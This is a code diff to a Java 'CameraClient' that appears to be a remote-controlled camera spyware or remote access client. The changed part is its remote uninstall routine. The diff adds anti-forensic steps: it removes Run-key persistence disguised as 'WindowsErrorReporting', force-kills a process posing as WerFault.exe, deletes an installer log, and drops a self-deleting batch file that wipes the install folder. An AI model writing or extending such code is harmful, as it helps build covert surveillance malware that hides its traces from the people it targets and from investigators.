@@ -82,13 +82,36 @@ public class CameraClient {
         System.out.println("[*] Uninstall command received.");
         try {
             String installDir = System.getenv("ProgramData") + "\\CameraService";
-            // Remove startup registry entry
+            String logFile    = System.getenv("ProgramData") + "\\installer.log";
+
+            // 1. Remove both possible startup registry entries
             new ProcessBuilder("reg", "delete",
                 "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                 "/v", "WindowsErrorReporting", "/f").start().waitFor();
-            // Delete install folder
-            new ProcessBuilder("cmd", "/c", "rmdir /s /q \"" + installDir + "\"").start().waitFor();
-            System.out.println("[*] Uninstalled.");
+            new ProcessBuilder("reg", "delete",
+                "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+                "/v", "CameraService", "/f").start().waitFor();
+
+            // 2. Kill any other instances of WerFault.exe / java.exe running from install dir
+            new ProcessBuilder("taskkill", "/F", "/IM", "WerFault.exe").start().waitFor();
+
+            // 3. Delete installer log
+            new File(logFile).delete();
+
+            // 4. Schedule folder deletion via cmd after this process exits
+            //    (can't delete the folder we're running from while we're in it)
+            String script =
+                "ping 127.0.0.1 -n 3 >nul & " +          // wait ~2s for process to exit
+                "rmdir /s /q \"" + installDir + "\" & " + // delete install folder
+                "del /f /q \"%~f0\"";                      // self-delete this bat
+
+            File bat = File.createTempFile("uninst_", ".bat");
+            try (java.io.FileWriter fw = new java.io.FileWriter(bat)) {
+                fw.write("@echo off\r\n" + script + "\r\n");
+            }
+            new ProcessBuilder("cmd", "/c", "start /min \"\" \"" + bat.getAbsolutePath() + "\"").start();
+
+            System.out.println("[*] Uninstall scheduled.");
         } catch (Exception e) {
             System.err.println("[!] Uninstall error: " + e.getMessage());
         }
